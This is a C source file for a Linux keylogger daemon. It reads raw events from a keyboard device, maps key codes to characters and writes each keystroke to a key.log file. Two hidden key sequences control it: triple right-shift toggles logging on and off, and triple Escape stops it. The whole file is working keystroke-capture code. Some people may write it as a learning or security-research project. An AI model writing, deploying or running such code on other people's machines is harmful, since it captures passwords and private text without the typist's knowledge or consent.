#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "common.h"
#include "input-args.h"
#include "logger.h"
#include "error.h"

#define BUFFSIZE 255

int create_log(const cmd_args_t cmd_args)
{
    int oflag, log_fd;
    char path[BUFFSIZE];
    struct stat stat_cwd;

    /* open for writing only, create file if doesn't exist, if file exists,
     * truncate it to 0 */
    oflag = (O_WRONLY | O_CREAT | O_TRUNC);

    getcwd(path, BUFFSIZE);

    /* collect information about the current directory */
    stat(path, &stat_cwd);

    strcat(path, "/key.log");
    logger.info("Log file: %s", path);

    log_fd = open(path, oflag, O_WRONLY);

    /* Set the owner to match that of the directory that it's run under */
    fchown(log_fd, stat_cwd.st_uid, stat_cwd.st_gid);
    fchmod(log_fd, cmd_args.keylog_mode);

    return log_fd;
}

void log_key(int fd, unsigned short code)
{
    char c;

    switch (code) {
    case KEY_1: c = '1'; break;
    case KEY_2: c = '2'; break;
    case KEY_3: c = '3'; break;
    case KEY_4: c = '4'; break;
    case KEY_5: c = '5'; break;
    case KEY_6: c = '6'; break;
    case KEY_7: c = '7'; break;
    case KEY_8: c = '8'; break;
    case KEY_9: c = '9'; break;
    case KEY_0: c = '0'; break;

    case KEY_A: c = 'a'; break;
    case KEY_B: c = 'b'; break;
    case KEY_C: c = 'c'; break;
    case KEY_D: c = 'd'; break;
    case KEY_E: c = 'e'; break;
    case KEY_F: c = 'f'; break;
    case KEY_G: c = 'g'; break;
    case KEY_H: c = 'h'; break;
    case KEY_I: c = 'i'; break;
    case KEY_J: c = 'j'; break;
    case KEY_K: c = 'k'; break;
    case KEY_L: c = 'l'; break;
    case KEY_M: c = 'm'; break;
    case KEY_N: c = 'n'; break;
    case KEY_O: c = 'o'; break;
    case KEY_P: c = 'p'; break;
    case KEY_Q: c = 'q'; break;
    case KEY_R: c = 'r'; break;
    case KEY_S: c = 's'; break;
    case KEY_T: c = 't'; break;
    case KEY_U: c = 'u'; break;
    case KEY_V: c = 'v'; break;
    case KEY_W: c = 'w'; break;
    case KEY_X: c = 'x'; break;
    case KEY_Y: c = 'y'; break;
    case KEY_Z: c = 'z'; break;

    case KEY_COMMA: c = ','; break;
    case KEY_SEMICOLON: c = ';'; break;
    case KEY_APOSTROPHE: c = '\''; break;
    case KEY_DOT: c = '.'; break;
    case KEY_SLASH: c = '/'; break;
    case KEY_BACKSLASH: c = '\\'; break;
    case KEY_BACKSPACE: c = '<'; break;

    case KEY_MINUS: c = '-'; break;
    case KEY_EQUAL: c = '='; break;
    case KEY_GRAVE: c = '~'; break;

    case KEY_ENTER: c = '\n'; break;
    case KEY_TAB: c = '\t'; break;
    case KEY_SPACE: c = ' '; break;

    default: c = '\0'; break;
    }

    write(fd, &c, 1);
}

struct seq {
    unsigned short *keys;
    unsigned short size;
    unsigned short index;
};

static bool has_seq_triggered(unsigned short ev_code,
                              struct seq *seq)
{
    bool seq_triggered = false;

    if (ev_code == seq->keys[seq->index]) {
        seq->index++;

        if (seq->index == seq->size) {
            seq->index = 0;
            seq_triggered = true;
        }
    } else {
        seq->index = 0;
    }

    return seq_triggered;
}

void keyloggerd(cmd_args_t cmd_args)
{
    int keyboard;

    /* Hardcode the input device for now... */
    if ((keyboard = open(cmd_args.keyboard_device, O_RDONLY)) == ERROR) {
        logger.error("Failed to open keyboard device %s: %s",
                     cmd_args.keyboard_device, strerror(errno));
        return;
    }

    /*
     * Structure definition:
     *
     * struct input_event {
     *    struct timeval time;
     *    unsigned short type;
     *    unsigned short code;
     *    unsigned int value;
     * }
     */
    struct input_event ev;
    enum ev_value {
        RELEASED,
        PRESSED,
        REPEATED,
    };

    ssize_t n;
    int log_fd = create_log(cmd_args);

    /*
     * The sequence of keys to start and stop the key logger
     */
    static unsigned short start_stop_keys[] = {
        KEY_RIGHTSHIFT, KEY_RIGHTSHIFT, KEY_RIGHTSHIFT
    };

    /*
     * The sequence of keys to kill the keylogger daemon
     */
    static unsigned short kill_keys[] = {
        KEY_ESC, KEY_ESC, KEY_ESC
    };

    struct seq start_stop_seq = {
        .keys = start_stop_keys,
        .size = ARRAY_SIZE(start_stop_keys),
        .index = 0
    };

    struct seq kill_seq = {
        .keys = kill_keys,
        .size = ARRAY_SIZE(kill_keys),
        .index = 0
    };

    bool log_key_enabled = true;

    while (1) {
        n = read(keyboard, &ev, sizeof(ev));

        if (n > 0) {
            if (ev.type == EV_KEY && ev.value == RELEASED) {
                if (log_key_enabled) {
                    log_key(log_fd, ev.code);
                }

                if (has_seq_triggered(ev.code, &start_stop_seq)) {
                    log_key_enabled = !log_key_enabled;

                    if (log_key_enabled) {
                        logger.warn("Key logging enabled");
                    } else {
                        logger.warn("Key logging disabled");
                    }
                }

                if (has_seq_triggered(ev.code, &kill_seq)) {
                    logger.warn("Magic kill switch sequence pressed");
                    break;
                }
            }
        } else {
            if (errno == EINTR) {
                continue;
            } else {
                logger.error("Failed to read bytes: %s", strerror(errno));
                break;
            }
        }
    }
}
